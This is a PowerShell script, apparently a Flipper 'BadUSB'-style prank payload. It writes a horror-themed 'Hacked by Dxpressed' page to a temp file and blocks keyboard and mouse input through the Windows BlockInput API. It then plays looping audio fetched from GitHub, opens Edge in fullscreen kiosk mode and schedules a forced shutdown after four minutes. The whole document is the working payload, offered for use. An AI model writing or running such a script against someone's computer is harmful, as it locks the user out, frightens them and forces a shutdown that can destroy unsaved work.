Add-Type -AssemblyName System.Windows.Forms

# Write HTML to a temp file
$html = @"

<html>
<head>
  <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      overflow: hidden;
      background: black;
      color: red;
      font-family: 'Creepster', cursive;
      height: 100%;
      background: url('https://raw.githubusercontent.com/andythecookie13bruce/flipper-script/main/creepy.jpg') no-repeat center center fixed;
      background-size: cover;
      animation: bgShake 0.2s infinite;
    }

    .text-container {
      text-align: center;
      margin-top: 8%;
      animation: pulseRed 2s infinite;
    }

    h1 {
      font-size: 100px;
      margin: 0;
      text-shadow: 0 0 20px red, 0 0 40px darkred;
      animation: glitchText 1s infinite;
    }

    h2 {
      font-size: 40px;
      animation: flicker 2s infinite;
    }

    .drip {
      color: crimson;
      position: relative;
      display: inline-block;
      animation: bloodDrip 3s infinite;
    }

    @keyframes flicker {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.5; }
    }

    @keyframes pulseRed {
      0% { text-shadow: 0 0 10px red; }
      50% { text-shadow: 0 0 40px red; }
      100% { text-shadow: 0 0 10px red; }
    }

    @keyframes glitchText {
      0% { transform: scale(1) rotate(0deg); }
      25% { transform: scale(1.02) rotate(1deg); }
      50% { transform: scale(0.98) rotate(-1deg); }
      75% { transform: scale(1.01) rotate(1deg); }
      100% { transform: scale(1) rotate(0deg); }
    }

    @keyframes bgShake {
      0% { background-position: center center; }
      25% { background-position: center left; }
      50% { background-position: center center; }
      75% { background-position: center right; }
      100% { background-position: center center; }
    }

    @keyframes bloodDrip {
      0% { transform: translateY(0); }
      100% { transform: translateY(15px); opacity: 0; }
    }

    .ghost-msg {
      position: absolute;
      color: rgba(255, 0, 0, 0.4);
      font-size: 20px;
      animation: floatGhost 10s infinite;
    }

    @keyframes floatGhost {
      0% { top: 100%; left: 50%; opacity: 0; }
      50% { top: 50%; opacity: 0.4; }
      100% { top: 0%; opacity: 0; }
    }
  </style>
</head>
<body>
  <div class="text-container">
    <h1 class="drip">☠️</h1>
    <h2 class="drip">Your soul is mine.</h2>
    <h2 class="drip">You shouldn’t have summoned me.</h2>
    <h2 class="drip">Hacked by Dxpressed</h2>
  </div>

  <div class="ghost-msg" style="left: 10%;">I see you...</div>
  <div class="ghost-msg" style="left: 60%;">Run while you can</div>
  <div class="ghost-msg" style="left: 30%;">Too late now</div>

  <script>
    document.addEventListener("mousemove", function(e) {
      let ghost = document.createElement("div");
      ghost.className = "ghost-msg";
      ghost.style.left = e.pageX + "px";
      ghost.style.top = e.pageY + "px";
      ghost.innerText = "👁️";
      document.body.appendChild(ghost);
      setTimeout(() => ghost.remove(), 1000);
    });
  </script>
</body>
</html>

"@
$tempHtml = "$env:TEMP\doom.html"
$html | Set-Content -Path $tempHtml -Encoding UTF8

# Disable keyboard with BlockInput (Windows Forms)
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class InputBlocker {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
}
"@
[InputBlocker]::BlockInput($true)

# Play music from GitHub
$player = New-Object System.Media.SoundPlayer
$player.SoundLocation = "https://raw.githubusercontent.com/andythecookie13bruce/flipper-script/main/sound.wav"
$player.LoadAsync()
$player.PlayLooping()

# Open crash page fullscreen
Start-Process "msedge.exe" "--kiosk $tempHtml" -WindowStyle Hidden

# Schedule shutdown (4 minutes)
Start-Process "shutdown.exe" -ArgumentList "/s /t 240 /f"

# Wait for shutdown
Start-Sleep -Seconds 250

# Re-enable input if still running
[InputBlocker]::BlockInput($false)
